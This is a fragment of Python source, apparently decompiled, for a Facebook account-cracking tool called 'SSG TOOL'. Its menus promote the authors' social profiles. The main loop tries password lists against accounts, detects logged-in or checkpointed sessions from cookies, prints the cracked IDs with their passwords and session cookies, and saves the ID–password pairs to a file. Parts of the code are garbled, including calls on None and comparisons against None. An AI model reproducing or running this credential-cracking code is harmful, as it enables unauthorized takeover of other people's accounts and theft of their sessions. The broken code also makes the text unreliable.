...
def ud():
    os.system('clear')
    jalan(logo)
    print(' [1] THARKI KO FOLLOW KARO')
  
    print(' [2] EXIT')
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100043732207774 ')
        FD()
        return None
...
def FD():
    os.system('clear')
    print(logo)
    print('\x1b[1;33m [1]LALA G KO FOLLOW KARO ')
    print(' [2] EXIT')
    opt = input('\n  \x1b[1;32m Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100053818932880 ')
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')
...
def o():
    ...
    jalan('\x1b[1;32m [2] \x1b[1;32mCONTACT OF THARKI')
    jalan(' \x1b[1;32m[3] \x1b[1;32MCONTACT OF LALA')
    jalan(' \x1b[1;32m[4] \x1b[1;32mJOIN WA GROUP')
    ...
    if None == '3':
        ...
        return None
    if None == '4':
        os.system('xdg-open https://chat.whatsapp.com/BlepDpaS3pdE8alYw2hoAp')
        return None
    if None == '0':
        os.system('exit')
        return None
...
\033[1;32m    .d8888b.   .d8888b.   .d8888b.  
\033[1;35m   d88P  Y88b d88P  Y88b d88P  Y88b 
\033[1;35m   Y88b.      Y88b.      888    888 
\033[1;32m    "Y888b.    "Y888b.   888        
\033[1;32m       "Y88b.     "Y88b. 888  88888 
\033[1;35m         "888       "888 888    888 
\033[1;35m   Y88b  d88P Y88b  d88P Y88b  d88P 
\033[1;32m    "Y8888P"   "Y8888P"   "Y8888P88 
                                                                                                        
\033[1;37m================= \33[32;45mKHURRAM\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mKHURRAM\33[0;m\033[1;32m && \033[1;33mRAHMAN\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m KHURAM $ LALA ABDUL RAHMAN
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mROMEO-ARAIN
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;35mTEAM         :  \033[1;35mSSG
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.3
\033[1;37m================= \33[32;45mRAHMAN\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO SSG TOOL\33[0;m
 
\033[1;37m================== \33[32;45mROMEO\33[0;m ======================\n""")
loop = 0
oks = []
cps = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(SSG-OK🔥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/SSG-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(SSG-CP🤕)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r     %s[SSG ON RIRE] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
